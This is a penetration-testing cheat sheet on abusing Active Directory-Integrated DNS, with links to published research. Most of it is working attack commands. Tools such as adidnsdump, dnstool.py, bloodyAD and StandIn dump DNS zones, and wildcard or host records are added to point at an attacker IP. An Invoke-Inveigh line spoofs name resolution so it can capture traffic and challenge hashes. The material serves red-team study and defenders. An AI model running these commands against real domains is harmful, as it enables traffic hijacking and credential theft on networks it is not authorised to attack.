# Active Directory - Integrated DNS - ADIDNS

ADIDNS zone DACL (Discretionary Access Control List) enables regular users to create child objects by default, attackers can leverage that and hijack traffic. Active Directory will need some time (~180 seconds) to sync LDAP changes via its DNS dynamic updates protocol.

* Enumerate all records
    ```ps1
    adidnsdump -u DOMAIN\\user --print-zones dc.domain.corp (--dns-tcp)
    # or
    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 get dnsDump
    ```
* Query a node
    ```ps1
    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action query $DomainController (--legacy)
    # or
    bloodyAD -u john.doe -p 'Password123!' --host 192.168.100.1 -d bloody.lab get search --base 'DC=DomainDnsZones,DC=bloody,DC=lab' --filter '(&(name=allmightyDC)(objectClass=dnsNode))' --attr dnsRecord
    ```
* Add a node and attach a record
    ```ps1
    dnstool.py -u 'DOMAIN\user' -p 'password' --record '*' --action add --data $AttackerIP $DomainController
    # or
    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 add dnsRecord dc1.example.lab <Attacker IP>

    bloodyAD --host 10.10.10.10 -d example.lab -u username -p pass123 remove dnsRecord dc1.example.lab <Attacker IP>
    ```

The common way to abuse ADIDNS is to set a wildcard record and then passively listen to the network.

```ps1
Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LLMNR Y -NBNS Y -mDNS Y -Challenge 1122334455667788 -MachineAccounts Y
```


## DNS Reconnaissance

Perform **ADIDNS** searches

```powershell
StandIn.exe --dns --limit 20
StandIn.exe --dns --filter SQL --limit 10
StandIn.exe --dns --forest --domain <domain> --user <username> --pass <password>
StandIn.exe --dns --legacy --domain <domain> --user <username> --pass <password>
```


## References

* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)